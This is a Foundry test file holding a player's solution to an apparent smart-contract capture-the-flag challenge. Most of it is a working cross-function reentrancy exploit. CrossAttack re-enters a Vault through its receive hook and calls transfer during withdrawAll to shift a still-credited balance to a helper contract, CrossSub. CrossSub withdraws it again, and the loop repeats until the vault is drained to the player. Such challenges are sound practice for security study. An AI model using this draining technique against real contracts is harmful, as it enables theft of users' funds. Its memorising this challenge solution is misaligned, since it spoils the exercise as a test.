// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 10000 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new CrossAttack(address (setup.vault())).attack{value:1 ether}();


        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////
contract CrossAttack {
    Vault c;
    bool reentrant;
    bool check;
    // address public attackerSub;
    CrossSub sub;
    // address public\\\ get_address;

    constructor(address vaultaddress) {
        // get_address=address(this);
        c=Vault(vaultaddress);
        sub=new CrossSub(vaultaddress);
    }

    function attack() public payable {
        check=false;

        while (address(c).balance>=address(this).balance){

            c.deposit{value:address(this).balance}();
            reentrant=false;
            c.withdrawAll();

            sub.attacknext();

        }

        check=true;
        c.deposit{value:address(c).balance}();
        reentrant=false;
        c.withdrawAll();

        sub.attacknext();

        // c.withdrawAll();
        (bool success,)=msg.sender.call{value:address(this).balance}("");
        require(success);

    }
    receive() external payable{
        if(reentrant==false){
            // if(check==false){
            reentrant=true;
            // if(check=true){
            //
            // } else {c.transfer(address(sub), address(this).balance);}
            if(check==false){c.transfer(address(sub), address(this).balance);}
            else { c.transfer(address(sub), address(c).balance);}

        }

    }

}

contract CrossSub{
    Vault c;
    constructor(address vaultaddress) {

        c=Vault(vaultaddress);
    }

    function attacknext() public{
        c.withdrawAll();

        (bool success,)=msg.sender.call{value:address(this).balance}("");
        require(success);

    }
    receive() external payable{}
}
// contract Cross_attack_2 {
//     Vault c;
//     address public A;
//     mapping(address => uint256) public balanceOf;
//     constructor(address vaultaddress) {

//         c=Vault(vaultaddress);
//     }
//     function attack() public {
//         c.withdrawAll();
//         (bool success,)=msg.sender.call{value:address(this).balance}("");
//         require(success);
//     }

//     receive() external payable{
//         if(msg.sender.balance != 0){
//             c.transfer(AttackerSub, balanceOf[msg.sender]);
//         }

//     }
// }
////////// YOUR CODE END //////////
